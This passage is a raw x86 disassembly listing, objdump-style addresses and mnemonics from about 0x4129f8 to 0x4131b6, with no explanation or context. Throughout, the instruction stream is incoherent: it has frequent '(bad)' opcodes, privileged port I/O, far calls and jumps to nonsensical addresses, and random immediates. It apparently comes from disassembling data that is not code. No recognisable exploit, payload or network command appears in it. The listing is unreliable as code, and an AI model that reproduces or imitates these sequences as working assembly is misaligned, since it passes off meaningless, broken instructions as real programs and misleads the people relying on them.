  4129f8:	lds    ebp,FWORD PTR [ebx-0x5359de4e]
  4129fe:	lahf   
  4129ff:	lahf   
  412a00:	xchg   DWORD PTR [eax-0x61],ecx
  412a03:	push   ecx
  412a04:	and    eax,0x75cb2ddb
  412a09:	jl     0x412a1d
  412a0b:	call   0x85c0:0xcedaec3c
  412a12:	pop    ebp
  412a13:	adc    DWORD PTR ds:0x333f6d31,edi
  412a19:	inc    ebx
  412a1a:	sbb    eax,0xbded347c
  412a1f:	dec    esp
  412a20:	inc    BYTE PTR [eax+0x778ed6ba]
  412a26:	mov    ch,0xeb
  412a28:	sahf   
  412a29:	pop    es
  412a2a:	mov    eax,ds:0x6c5376d5
  412a2f:	xlat   BYTE PTR ds:[ebx]
  412a30:	jno    0x4129d5
  412a32:	nop
  412a33:	out    0x58,eax
  412a35:	popa   
  412a36:	mov    BYTE PTR [ebp+0x33],bh
  412a39:	nop
  412a3a:	rol    BYTE PTR [ebx+0x26],0xbf
  412a3e:	icebp  
  412a3f:	dec    edi
  412a40:	ins    BYTE PTR es:[edi],dx
  412a41:	adc    edx,ebp
  412a43:	in     al,dx
  412a44:	mov    al,ds:0x7adac02f
  412a49:	mov    ds:0x539547cf,al
  412a4e:	in     al,dx
  412a4f:	adc    al,0xd2
  412a51:	pop    ecx
  412a52:	outs   dx,DWORD PTR ds:[esi]
  412a53:	push   ebp
  412a54:	ja     0x412a52
  412a56:	cmc    
  412a57:	mov    WORD PTR [eax],es
  412a59:	sbb    al,BYTE PTR [esi-0x76253f0c]
  412a5f:	je     0x412a68
  412a61:	cmp    eax,0x9646b2ff
  412a66:	(bad)  
  412a67:	xor    al,0x57
  412a69:	rcl    ecx,cl
  412a6b:	pop    es
  412a6c:	ins    DWORD PTR es:[edi],dx
  412a6d:	mov    dh,0x52
  412a6f:	ss (bad) 
  412a71:	add    eax,0xe4bdd734
  412a76:	inc    ecx
  412a77:	adc    dl,BYTE PTR ds:0xb36cba5a
  412a7d:	int3   
  412a7e:	test   BYTE PTR [eax-0x13],0x10
  412a82:	pop    esp
  412a83:	inc    ebp
  412a84:	int    0xfb
  412a86:	xchg   edx,eax
  412a87:	(bad)  
  412a88:	jge    0x412a6f
  412a8a:	out    dx,eax
  412a8b:	jbe    0x412a3f
  412a8d:	adc    bh,BYTE PTR [ecx+0x4c]
  412a90:	out    dx,al
  412a91:	jp     0x412a5a
  412a93:	sub    DWORD PTR [edx+0x1d],ebx
  412a96:	add    al,BYTE PTR [esi+0x4ee4a8d2]
  412a9c:	mov    ecx,0x86926dcb
  412aa1:	xor    al,0xd6
  412aa3:	mov    ds:0xc98ddebf,al
  412aa8:	fistp  DWORD PTR [ecx+0x6b9f8711]
  412aae:	daa    
  412aaf:	scas   eax,DWORD PTR es:[edi]
  412ab0:	(bad)  
  412ab1:	sbb    al,0x11
  412ab3:	std    
  412ab4:	enter  0x7663,0xa8
  412ab8:	sub    al,BYTE PTR ss:0x37badcc7
  412abf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ac0:	jb     0x412a51
  412ac2:	fnstsw WORD PTR [ebp+0x3eb5f918]
  412ac8:	cmp    DWORD PTR [edx+0x50f93a04],ecx
  412ace:	push   eax
  412acf:	sar    DWORD PTR [edi],cl
  412ad1:	lock bts DWORD PTR [esi-0x4e8ddcfd],0x5c
  412ada:	or     DWORD PTR [ebp+0x61a3fc3d],ebp
  412ae0:	mov    BYTE PTR [eax],bh
  412ae2:	pop    esp
  412ae3:	test   BYTE PTR [esi+ecx*8],cl
  412ae6:	jne    0x412b3e
  412ae8:	mov    DWORD PTR gs:[esi-0x12],ecx
  412aec:	sbb    BYTE PTR [ebx],dl
  412aee:	xor    BYTE PTR [edx],0xee
  412af1:	push   ss
  412af2:	pop    ecx
  412af3:	mov    bh,0x1c
  412af5:	cmp    BYTE PTR [eax],bh
  412af7:	repz enter 0xf72,0x54
  412afc:	les    edx,FWORD PTR [eax+0x4e01e9bc]
  412b02:	cmp    eax,0xa8db0b40
  412b07:	out    0x29,al
  412b09:	and    eax,ecx
  412b0b:	add    cl,dl
  412b0d:	call   0xf8a1:0x5b390073
  412b14:	mov    al,0x3e
  412b16:	jg     0x412ad1
  412b18:	inc    edi
  412b19:	ins    BYTE PTR es:[edi],dx
  412b1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b1b:	cmp    DWORD PTR [eax-0x34],edx
  412b1e:	lahf   
  412b1f:	mov    ch,0x9a
  412b21:	jnp    0x412add
  412b23:	pop    edx
  412b24:	in     eax,dx
  412b25:	fistp  WORD PTR [esp+eax*8+0x1eb2731b]
  412b2c:	lods   al,BYTE PTR es:[esi]
  412b2e:	sub    BYTE PTR [esi],bl
  412b30:	inc    esi
  412b31:	jns    0x412b45
  412b33:	add    dh,cl
  412b35:	enter  0xc004,0xd8
  412b39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b3a:	jno    0x412b32
  412b3c:	fistp  WORD PTR [edi]
  412b3e:	outs   dx,BYTE PTR ds:[esi]
  412b3f:	lahf   
  412b40:	test   DWORD PTR [edx-0x36],0x2d53ad8a
  412b47:	fucomi st,st(6)
  412b49:	cmp    DWORD PTR es:[edx*4-0x39c96541],eax
  412b51:	adc    eax,DWORD PTR [eax+0x5439ace8]
  412b57:	jle    0x412b80
  412b59:	ss push ebx
  412b5b:	int    0xd2
  412b5d:	addr16 in eax,0x13
  412b60:	in     eax,dx
  412b61:	nop
  412b62:	mov    esi,0xc98f680a
  412b67:	fst    QWORD PTR ds:0x400b2f38
  412b6d:	sbb    eax,0xe724272c
  412b72:	scas   al,BYTE PTR es:[edi]
  412b73:	fdivr  st(6),st
  412b75:	mov    dl,0xe0
  412b77:	mov    ebx,0xeaea2970
  412b7c:	jo     0x412b47
  412b7e:	retf   0xc1e8
  412b81:	pop    ecx
  412b82:	(bad)  
  412b83:	sti    
  412b84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b85:	pop    edi
  412b86:	sub    eax,0x32c98ce0
  412b8b:	sbb    edx,eax
  412b8d:	ror    ebx,1
  412b8f:	sub    BYTE PTR [esi],ch
  412b91:	mov    bh,0x20
  412b93:	xor    al,0x66
  412b95:	enter  0xa88e,0x6f
  412b99:	mov    ch,0x12
  412b9b:	test   eax,0x37f86117
  412ba0:	gs adc eax,edx
  412ba3:	cmp    cl,BYTE PTR [edi]
  412ba5:	xchg   esi,eax
  412ba6:	inc    esi
  412ba7:	mov    ch,0x64
  412ba9:	mov    dl,0x6a
  412bab:	pop    eax
  412bac:	and    cl,al
  412bae:	imul   ebp,DWORD PTR [ebx],0xffffffed
  412bb1:	adc    eax,0xaabd91c0
  412bb6:	int3   
  412bb7:	mov    ebx,0x7d07713a
  412bbc:	dec    esi
  412bbd:	mov    esp,ds
  412bbf:	scas   eax,DWORD PTR es:[edi]
  412bc0:	push   es
  412bc1:	add    BYTE PTR [esi-0x44],al
  412bc4:	and    al,BYTE PTR [ebx+0x2d490bc9]
  412bca:	int    0x25
  412bcc:	fbstp  TBYTE PTR [edi]
  412bce:	daa    
  412bcf:	rcl    DWORD PTR [ecx-0x7d904cac],cl
  412bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bd7:	(bad)  
  412bd8:	mov    edx,0x3ec38b07
  412bdd:	sti    
  412bde:	in     al,0x50
  412be0:	cmp    eax,0x3ec60c05
  412be5:	push   ecx
  412be6:	mov    al,ds:0xbbee3e94
  412beb:	ja     0x412c6c
  412bed:	outs   dx,DWORD PTR fs:[esi]
  412bef:	jmp    0x9aac2e8
  412bf4:	inc    edx
  412bf5:	outs   dx,DWORD PTR ds:[esi]
  412bf6:	fdiv   DWORD PTR [edx+0x4e28575b]
  412bfc:	sub    bh,ch
  412bfe:	mov    esp,0xbcebddf4
  412c03:	lds    edi,FWORD PTR [ebp-0x4ee622bd]
  412c09:	ins    BYTE PTR es:[edi],dx
  412c0a:	call   0x71be:0x83ab9a95
  412c11:	jns    0x412c48
  412c13:	xor    al,0x13
  412c15:	add    DWORD PTR [ebp+0x3b],eax
  412c18:	(bad)  
  412c19:	xor    DWORD PTR [edi-0x68],ecx
  412c1c:	mov    ah,0x79
  412c1e:	in     eax,dx
  412c1f:	aad    0x98
  412c21:	adc    eax,0x37bf3939
  412c26:	sub    cl,BYTE PTR [edi-0x57acbe31]
  412c2c:	mov    eax,0x678cc74
  412c31:	xchg   ebp,eax
  412c32:	pop    ebp
  412c33:	add    bh,BYTE PTR [eax+0x30b9165]
  412c39:	sub    BYTE PTR [ebx+eax*1+0xc],ch
  412c3d:	imul   edi,DWORD PTR [esi],0x5106848a
  412c43:	imul   esi,DWORD PTR [ecx-0x2f7a1af2],0xe6eb8154
  412c4d:	pusha  
  412c4e:	sbb    ch,BYTE PTR [ecx]
  412c50:	das    
  412c51:	or     al,0x1a
  412c53:	sbb    eax,0x152c2b11
  412c58:	mov    edx,0xdc1dcd62
  412c5d:	jl     0x412c99
  412c5f:	push   ebp
  412c60:	mov    al,0x1b
  412c62:	fdivr  QWORD PTR [ecx+esi*4]
  412c65:	jns    0x412ccc
  412c67:	mov    al,0xc8
  412c69:	stc    
  412c6a:	xchg   esp,eax
  412c6b:	in     eax,0xb9
  412c6d:	dec    ebp
  412c6e:	gs dec ebp
  412c70:	int3   
  412c71:	push   esi
  412c72:	aas    
  412c73:	mov    edi,0xb81c62db
  412c78:	mov    edx,0x6ce28d88
  412c7d:	sar    DWORD PTR [ebp+0x40],cl
  412c80:	inc    ebx
  412c81:	push   esp
  412c82:	mov    esp,0x6cfe70ec
  412c87:	adc    eax,0x29bf24c
  412c8c:	sbb    DWORD PTR [ebx-0x4d],edi
  412c8f:	fdiv   DWORD PTR [ebp+0x57]
  412c92:	jmp    0x3a0264d2
  412c97:	mov    bh,0xc8
  412c99:	fldenv [eax-0x5c]
  412c9c:	push   0xffffffd2
  412c9e:	sbb    esp,DWORD PTR [edx-0x76e2b679]
  412ca4:	outs   dx,BYTE PTR ds:[esi]
  412ca5:	xor    eax,0xb9560d7b
  412caa:	(bad)  
  412cab:	fist   DWORD PTR [edx-0x6fea46b8]
  412cb1:	sbb    esp,DWORD PTR [edi+0x6c]
  412cb4:	inc    edx
  412cb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cb6:	mov    DWORD PTR cs:[ebx+0x13],edi
  412cba:	mov    dl,0x60
  412cbc:	or     dl,BYTE PTR [esi+0x311d9d00]
  412cc2:	mov    ch,al
  412cc4:	or     eax,0xa6723d30
  412cc9:	loop   0x412cc1
  412ccb:	out    dx,eax
  412ccc:	inc    esp
  412ccd:	pop    ebp
  412cce:	mov    dl,0xfc
  412cd0:	in     al,0xb7
  412cd2:	mov    edi,0x8336fbae
  412cd7:	jb     0x412ca2
  412cd9:	fldenv [edi+0x7d]
  412cdc:	pop    ecx
  412cdd:	sbb    esi,eax
  412cdf:	cmp    bh,BYTE PTR [ecx-0x59]
  412ce2:	mov    ebx,0x669f1592
  412ce7:	jmp    0xea3e4d17
  412cec:	scas   al,BYTE PTR es:[edi]
  412ced:	inc    esp
  412cee:	xchg   ebx,eax
  412cef:	retf   0x2fd9
  412cf2:	and    dl,cl
  412cf4:	lods   al,BYTE PTR ds:[esi]
  412cf5:	out    dx,eax
  412cf6:	sub    dh,BYTE PTR [eax+0x54cff739]
  412cfc:	pusha  
  412cfd:	cmp    eax,0x7ac7277a
  412d02:	inc    ecx
  412d03:	test   DWORD PTR [ecx],0x880816b5
  412d09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d0a:	sbb    bh,dl
  412d0c:	enter  0x7c41,0x7
  412d10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d11:	inc    ebx
  412d12:	cmp    DWORD PTR [edx],edx
  412d14:	(bad)  
  412d15:	cli    
  412d16:	outs   dx,BYTE PTR ds:[esi]
  412d17:	push   ebx
  412d18:	pop    ecx
  412d19:	sub    DWORD PTR [edx-0x72a311d2],esp
  412d1f:	jge    0x412cd4
  412d21:	mov    esi,0xe213bedf
  412d26:	fadd   st(3),st
  412d28:	push   ecx
  412d29:	sbb    eax,0xf5aeb347
  412d2e:	les    edi,FWORD PTR [esi]
  412d30:	xchg   ecx,eax
  412d31:	div    DWORD PTR [ebx-0x46bba930]
  412d37:	sti    
  412d38:	push   edi
  412d39:	jae    0x412cd2
  412d3b:	jne    0x412d26
  412d3d:	stos   BYTE PTR es:[edi],al
  412d3e:	or     eax,0xa0f1f41
  412d43:	or     al,0xab
  412d45:	stos   BYTE PTR es:[edi],al
  412d46:	icebp  
  412d47:	and    ch,BYTE PTR [ebx-0x3a]
  412d4a:	push   ss
  412d4b:	aad    0x2b
  412d4d:	mov    edx,0xf5d06da8
  412d52:	mov    bh,ch
  412d54:	xor    ah,0xca
  412d57:	jo     0x412d44
  412d59:	ret    
  412d5a:	push   ebp
  412d5b:	push   eax
  412d5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d5d:	ss fwait
  412d5f:	(bad)
  412d62:	loope  0x412d03
  412d64:	mov    BYTE PTR [edi+0x50],ah
  412d67:	dec    ecx
  412d68:	retf   0x7dcb
  412d6b:	sub    eax,eax
  412d6d:	push   cs
  412d6e:	push   cs
  412d6f:	shl    al,1
  412d71:	mov    dl,0x6a
  412d73:	inc    DWORD PTR [eax-0x712ce2ee]
  412d79:	icebp  
  412d7a:	dec    esi
  412d7b:	jecxz  0x412d3b
  412d7d:	sbb    ebx,esi
  412d7f:	(bad)  
  412d80:	cmp    BYTE PTR [eax],bl
  412d82:	mov    ch,0x14
  412d84:	jns    0x412d15
  412d86:	inc    edx
  412d87:	rcr    ebx,1
  412d89:	jmp    0x412ded
  412d8b:	mov    edx,gs
  412d8d:	push   0xfffffffe
  412d8f:	pop    ds
  412d90:	sub    ecx,DWORD PTR [edx-0x6c]
  412d93:	cmovne edx,DWORD PTR [eax]
  412d96:	inc    esp
  412d97:	mov    dh,0xb1
  412d99:	loop   0x412d34
  412d9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d9c:	mov    BYTE PTR [esp+eax*8],ch
  412d9f:	jo     0x412dce
  412da1:	dec    ebp
  412da2:	lods   al,BYTE PTR ds:[esi]
  412da3:	das    
  412da4:	xor    eax,0x6ff1bf66
  412da9:	xchg   edx,eax
  412daa:	ins    DWORD PTR es:[edi],dx
  412dab:	adc    DWORD PTR [edx+0x57c31c65],ebx
  412db1:	mov    bl,0xb8
  412db3:	out    0x23,al
  412db5:	mov    dh,0xa6
  412db7:	dec    edi
  412db8:	push   0x1bffb63d
  412dbd:	inc    ecx
  412dbe:	aaa    
  412dbf:	test   edi,esi
  412dc1:	lock js 0x412da8
  412dc4:	mov    cl,0x37
  412dc6:	mov    ebp,0x561a247e
  412dcb:	pop    edi
  412dcc:	sti    
  412dcd:	test   eax,0x55bcb751
  412dd2:	xor    dh,BYTE PTR [edi+0x7d5a7f15]
  412dd8:	(bad)  
  412dd9:	jns    0x412e1d
  412ddb:	cld    
  412ddc:	jo     0x412da2
  412dde:	inc    ecx
  412ddf:	ficom  DWORD PTR ds:0xba9482f7
  412de5:	repz jmp 0x412e64
  412de8:	jae    0x412e0d
  412dea:	mov    ecx,0x81826fff
  412def:	and    dh,BYTE PTR [eax]
  412df1:	jp     0x412d93
  412df3:	mov    esp,DWORD PTR [esi-0x18acb9ea]
  412df9:	mov    ch,0xb8
  412dfb:	stos   DWORD PTR es:[edi],eax
  412dfc:	jne    0x412e25
  412dfe:	mov    ebx,0x1c2a7f44
  412e03:	les    edx,FWORD PTR [esi-0x5797d308]
  412e09:	push   edi
  412e0a:	stos   DWORD PTR es:[edi],eax
  412e0b:	xor    ah,cl
  412e0d:	fistp  DWORD PTR [ecx+ebp*4-0x8]
  412e11:	or     DWORD PTR [edi],eax
  412e13:	lock or DWORD PTR [edi],0xffffffa4
  412e17:	sbb    ch,0xf2
  412e1a:	or     BYTE PTR [esi+0x2f83bc9d],dh
  412e20:	sbb    DWORD PTR ds:0xdfa43a5a,ecx
  412e26:	sub    esi,ebp
  412e28:	out    0xd9,eax
  412e2a:	sub    DWORD PTR [ecx+0x2ed4654c],0xb236276b
  412e34:	mov    ds,WORD PTR [ebx+0x51]
  412e37:	and    al,0xfb
  412e39:	aas    
  412e3a:	int    0x8d
  412e3c:	dec    esp
  412e3d:	add    bh,bl
  412e3f:	in     al,0xe8
  412e41:	add    BYTE PTR [ebp+0x5a3ad822],dl
  412e47:	(bad)  
  412e48:	pop    es
  412e49:	aaa    
  412e4a:	(bad)  
  412e4b:	enter  0x6e0a,0x6d
  412e4f:	rol    ch,cl
  412e51:	retf   0x4390
  412e54:	repnz cdq 
  412e56:	adc    edi,DWORD PTR [ebx+0x3e810745]
  412e5c:	mov    eax,ds:0xd0fb76dc
  412e61:	dec    eax
  412e62:	xchg   DWORD PTR [esi+0x69e9a516],esp
  412e68:	int    0x48
  412e6a:	and    ah,BYTE PTR [edx]
  412e6c:	in     al,0xad
  412e6e:	xchg   DWORD PTR [edx-0x4e15aa13],ebp
  412e74:	fbstp  TBYTE PTR [edx]
  412e76:	and    eax,DWORD PTR [ebx]
  412e78:	fisttp WORD PTR [ecx]
  412e7a:	int    0x2d
  412e7c:	jne    0x412e74
  412e7e:	enter  0x4496,0xae
  412e82:	xor    DWORD PTR [ebx+0x14825ca6],0xe7c8086
  412e8c:	push   esi
  412e8d:	or     edx,DWORD PTR fs:[edx-0x13]
  412e91:	adc    ebp,DWORD PTR [eax-0x2a]
  412e94:	repz push cs
  412e96:	je     0x412e96
  412e98:	xchg   esi,eax
  412e99:	in     eax,0x5b
  412e9b:	dec    esp
  412e9c:	repz sub cl,ch
  412e9f:	rcl    bl,1
  412ea1:	stos   DWORD PTR es:[edi],eax
  412ea2:	lock mov dl,0xdd
  412ea5:	and    ecx,DWORD PTR [ebx+esi*2-0x78]
  412ea9:	test   al,0x5c
  412eab:	and    bl,BYTE PTR [ebp+0x4f617e72]
  412eb1:	nop
  412eb2:	addr16 pop ss
  412eb4:	inc    edi
  412eb5:	and    al,0x6c
  412eb7:	pop    esp
  412eb8:	add    BYTE PTR [edx-0x7fdb0c85],dh
  412ebe:	fisub  DWORD PTR [ecx]
  412ec0:	cmp    bh,BYTE PTR [ebp-0x7c4099b4]
  412ec6:	jl     0x412ee8
  412ec8:	(bad)  
  412ec9:	iret   
  412eca:	push   ecx
  412ecb:	(bad)  
  412ecc:	cmp    al,0x5d
  412ece:	arpl   WORD PTR [eax-0x529508db],bp
  412ed4:	inc    ecx
  412ed5:	or     DWORD PTR [ecx-0x50a7ad2f],esi
  412edb:	sub    BYTE PTR [eax],ch
  412edd:	cmp    eax,0xefb0c4ed
  412ee2:	or     al,0x55
  412ee4:	popf   
  412ee5:	ins    BYTE PTR es:[edi],dx
  412ee6:	cs rep stos DWORD PTR es:[edi],eax
  412ee9:	fst    DWORD PTR [edx+0x40342ba8]
  412eef:	mov    al,0x9b
  412ef1:	dec    esp
  412ef2:	sar    DWORD PTR [ecx+0x27],1
  412ef5:	retf   0xac1e
  412ef8:	adc    al,0x49
  412efa:	(bad)  
  412efb:	dec    esi
  412efc:	push   ds
  412efd:	test   eax,0xe3bc339
  412f02:	cmp    ebx,DWORD PTR [ebp-0x34]
  412f05:	je     0x412ed2
  412f07:	popf   
  412f08:	push   edi
  412f09:	outs   dx,BYTE PTR ds:[esi]
  412f0a:	out    0xad,al
  412f0c:	daa    
  412f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f0e:	mov    ds:0x36811a1d,al
  412f13:	xor    DWORD PTR [ecx+0x14],0xffffffb4
  412f17:	dec    ebx
  412f18:	js     0x412f68
  412f1a:	xchg   ecx,eax
  412f1b:	test   eax,0x6f367dc9
  412f20:	sub    cl,ah
  412f22:	mov    dl,0xf5
  412f24:	sbb    al,0x17
  412f26:	mov    gs,WORD PTR [edi]
  412f28:	(bad)  
  412f29:	inc    edx
  412f2a:	mov    eax,ds:0x43b9b63b
  412f2f:	loope  0x412f16
  412f31:	mov    esi,0x77d7160
  412f36:	mov    dh,0x18
  412f38:	cwde   
  412f39:	mov    edx,0x437a8647
  412f3e:	inc    eax
  412f3f:	push   edx
  412f40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f41:	mov    dl,0xed
  412f43:	mov    edi,0x12bb279e
  412f48:	pushf  
  412f49:	std    
  412f4a:	popf   
  412f4b:	rcr    BYTE PTR [eax+0x28b0bdb3],1
  412f51:	les    esp,FWORD PTR [edx+0x29]
  412f54:	pusha  
  412f55:	aas    
  412f56:	dec    ecx
  412f57:	das    
  412f58:	sub    BYTE PTR [ebp+0x51df444d],dh
  412f5e:	rcl    BYTE PTR [esi+0x22489efa],1
  412f64:	push   edx
  412f65:	sub    al,BYTE PTR [edi+0x23]
  412f68:	ror    dl,cl
  412f6a:	mov    esi,0xa6b930cf
  412f70:	out    dx,eax
  412f71:	cli    
  412f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f73:	jae    0x412fcd
  412f75:	imul   BYTE PTR [edx+ebx*8-0x6226ae63]
  412f7c:	cmp    DWORD PTR [ecx+0x3652b4f2],ebx
  412f82:	popf   
  412f83:	lds    edi,FWORD PTR [eax+0x1606191f]
  412f89:	and    al,BYTE PTR ds:0xfc14d0a7
  412f8f:	jp     0x412f7b
  412f91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f92:	lea    edi,[ecx]
  412f94:	sub    BYTE PTR ds:0x7a918dfc,cl
  412f9a:	dec    ebp
  412f9b:	add    bl,ch
  412f9d:	daa    
  412f9e:	xchg   ebx,eax
  412f9f:	or     cl,BYTE PTR [edi]
  412fa1:	cmp    eax,0x21fa0328
  412fa6:	mov    ds:0x253d06bf,al
  412fab:	shr    DWORD PTR [eax],1
  412fad:	cs cmc 
  412faf:	loope  0x412f7a
  412fb1:	add    al,0x5a
  412fb3:	out    0x59,al
  412fb5:	and    eax,0xf0b2bc27
  412fba:	fs pop edi
  412fbc:	nop
  412fbd:	(bad)  
  412fbf:	ins    DWORD PTR es:[edi],dx
  412fc0:	fsubp  st(0),st
  412fc2:	sub    al,0xc5
  412fc4:	iret   
  412fc5:	xchg   ebp,eax
  412fc6:	push   ds
  412fc7:	add    edx,DWORD PTR [ebx-0x2b]
  412fca:	and    BYTE PTR [esi],cl
  412fcc:	jl     0x412fac
  412fce:	aaa    
  412fcf:	ins    BYTE PTR es:[edi],dx
  412fd0:	fiadd  DWORD PTR [esi-0x77]
  412fd3:	(bad)  
  412fd4:	loopne 0x412fd2
  412fd6:	in     eax,dx
  412fd7:	dec    ebx
  412fd8:	pop    edi
  412fd9:	xor    al,0xaa
  412fdb:	iret   
  412fdc:	mov    WORD PTR [ebp+0x515fc414],gs
  412fe2:	outs   dx,DWORD PTR ds:[esi]
  412fe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fe4:	xor    eax,0xefc10949
  412fe9:	in     eax,0xb
  412feb:	mov    al,0x81
  412fed:	adc    DWORD PTR [ebx],ecx
  412fef:	and    ebp,esp
  412ff1:	inc    ecx
  412ff2:	into   
  412ff3:	mov    bl,0xa6
  412ff5:	jns    0x412f84
  412ff7:	jge    0x412fa3
  412ff9:	xor    DWORD PTR [edx+0x54],ecx
  412ffc:	dec    esp
  412ffd:	dec    eax
  412ffe:	push   ss
  412fff:	push   ss
  413000:	mov    ds:0x1fb8a81a,al
  413005:	xlat   BYTE PTR ds:[ebx]
  413006:	invlpg BYTE PTR [esi+0x3871752c]
  41300d:	mov    DWORD PTR [eax+0x4a98856b],eax
  413013:	adc    eax,0x8652909a
  413018:	xchg   esi,eax
  413019:	in     al,dx
  41301a:	add    BYTE PTR [eax-0x1f6c354c],dh
  413020:	icebp  
  413021:	pop    edi
  413022:	ins    DWORD PTR es:[edi],dx
  413023:	xor    DWORD PTR [edx+0x47],esp
  413026:	stos   BYTE PTR es:[edi],al
  413027:	and    DWORD PTR [edx+0x49b46490],esp
  41302d:	mov    ch,0x5e
  41302f:	mov    bl,0x72
  413031:	xchg   BYTE PTR [edi+edi*8+0x4d3f1643],cl
  413038:	jmp    0x412fc3
  41303a:	loop   0x413013
  41303c:	(bad)  
  41303d:	mov    cl,BYTE PTR [edi+eiz*4-0x6d]
  413041:	fcom   QWORD PTR [esi]
  413043:	lods   al,BYTE PTR ds:[esi]
  413044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413045:	and    BYTE PTR [esi+0x29],ch
  413048:	push   edi
  413049:	inc    edi
  41304a:	mov    DWORD PTR [ecx-0x30d0cf00],ebx
  413050:	cmp    DWORD PTR [esp+ebx*4],0x7a087666
  413057:	ret    0x28bf
  41305a:	pop    esi
  41305b:	inc    edi
  41305c:	xor    al,0xb
  41305e:	jge    0x413018
  413060:	mov    ds:0x88c8c9be,eax
  413065:	ss push ss
  413067:	pop    esp
  413068:	sub    BYTE PTR [esp+ecx*8+0x67],dl
  41306c:	add    al,0xa9
  41306e:	push   ebx
  41306f:	outs   dx,DWORD PTR ds:[esi]
  413070:	nop
  413071:	mov    eax,ds:0x25e501c4
  413076:	or     BYTE PTR [ebx],cl
  413078:	push   ebx
  413079:	loope  0x4130bd
  41307b:	mov    esp,edi
  41307d:	cmp    esi,DWORD PTR [esi-0x3]
  413080:	mov    eax,0x4f9b3a75
  413085:	ds and al,0xe1
  413088:	mov    ebx,0x8f8080b
  41308d:	iret   
  41308e:	xchg   edi,eax
  41308f:	leave  
  413090:	jge    0x413101
  413092:	stos   BYTE PTR es:[edi],al
  413093:	xor    al,0xac
  413095:	adc    al,0x3a
  413097:	sbb    al,BYTE PTR ds:0xb76df898
  41309d:	shl    BYTE PTR [edi-0x6fd9e311],1
  4130a3:	cmp    DWORD PTR [ecx-0xe],eax
  4130a6:	cmp    dh,BYTE PTR [esi-0x1a57af0]
  4130ac:	pop    edi
  4130ad:	cmp    BYTE PTR [edx],ah
  4130af:	inc    esp
  4130b0:	push   esi
  4130b1:	dec    ebp
  4130b2:	and    BYTE PTR [ecx-0x3f],ch
  4130b5:	xchg   edi,eax
  4130b6:	fistp  QWORD PTR [ebx+0x35]
  4130b9:	aaa    
  4130ba:	mov    esi,0x89ecd2b3
  4130bf:	sbb    DWORD PTR [ecx+eiz*4],0x6e4a3865
  4130c6:	mov    eax,0xccaf9fc4
  4130cb:	cwde   
  4130cc:	into   
  4130cd:	in     eax,0x78
  4130cf:	sbb    BYTE PTR [esp+eiz*8-0x347040c5],al
  4130d6:	mov    esi,0x1eadbb73
  4130db:	iret   
  4130dc:	jle    0x4130ab
  4130de:	xor    esp,edx
  4130e0:	ficom  DWORD PTR [esi+0x58e5a682]
  4130e6:	dec    edi
  4130e7:	in     al,0xff
  4130e9:	idiv   ebp
  4130eb:	test   BYTE PTR [ebx],dh
  4130ed:	bound  esp,QWORD PTR [esp+ecx*1+0x5793db43]
  4130f4:	add    BYTE PTR [edi-0x3c],0x44
  4130f8:	cli    
  4130f9:	sbb    al,0xba
  4130fb:	pusha  
  4130fc:	or     BYTE PTR [esi-0x448a7dc7],ch
  413102:	inc    ebp
  413103:	pop    ds
  413104:	mov    ebx,DWORD PTR [esi+0x4]
  413107:	mov    ds:0x1eff0f64,al
  41310c:	mov    eax,ds
  41310e:	mov    ds:0x2456be76,al
  413113:	mov    eax,ds:0xbf133468
  413118:	popa   
  413119:	fyl2xp1 
  41311b:	idiv   DWORD PTR [ecx-0x20]
  41311e:	std    
  41311f:	or     al,0x3b
  413121:	jp     0x4130d5
  413123:	mov    ds:0xeee25a2a,al
  413128:	test   al,0xa
  41312a:	adc    DWORD PTR [edx-0x3d],0xffffff87
  41312e:	mov    esi,0xa44dc0a4
  413133:	mov    bl,0xdd
  413135:	js     0x413115
  413137:	mov    ch,BYTE PTR [esi+0x2d592839]
  41313d:	add    ah,BYTE PTR [ebp+0x6abe1582]
  413143:	cld    
  413144:	pushf  
  413145:	repnz mov ch,0xd3
  413148:	je     0x41317d
  41314a:	jecxz  0x41318f
  41314c:	mov    BYTE PTR [esp+edx*4],0x7b
  413150:	ror    BYTE PTR [ecx-0x62],1
  413153:	inc    esi
  413154:	sahf   
  413155:	xchg   esi,eax
  413156:	mov    esi,DWORD PTR [ebx-0x3ce07225]
  41315c:	fwait
  41315d:	sbb    cl,BYTE PTR ds:[esi+0x74]
  413161:	enter  0xbc6e,0xf2
  413165:	loop   0x41310c
  413167:	mov    WORD PTR [edx-0x50beabb2],?
  41316d:	pop    edx
  41316e:	aas    
  41316f:	fcomp  QWORD PTR [esi+0x77e5e5e1]
  413175:	xchg   edx,eax
  413176:	adc    esp,DWORD PTR [ecx]
  413178:	add    esi,ecx
  41317a:	pop    ebx
  41317b:	ror    DWORD PTR [eax+eiz*8],cl
  41317e:	cmp    dh,BYTE PTR [eax-0x2cc0622d]
  413184:	jle    0x413183
  413186:	popf   
  413187:	hlt    
  413188:	out    dx,eax
  413189:	imul   edi,DWORD PTR [ebx+0x56],0xffffffff
  41318d:	add    ah,BYTE PTR [edi+0x13f064c]
  413193:	mov    eax,ds:0x9077b54c
  413198:	sub    ch,BYTE PTR [ecx]
  41319a:	out    0xe2,eax
  41319c:	out    dx,al
  41319d:	je     0x41316e
  41319f:	jmp    0x74d9:0x49416c4c
  4131a6:	xchg   esi,eax
  4131a7:	pop    eax
  4131a8:	and    DWORD PTR [ebx],edx
  4131aa:	stos   DWORD PTR es:[edi],eax
  4131ab:	ficom  WORD PTR ds:0x5a3c535d
  4131b1:	mov    WORD PTR [esi+0x44],gs
  4131b4:	in     al,0xf2
  4131b6:	pop    edx
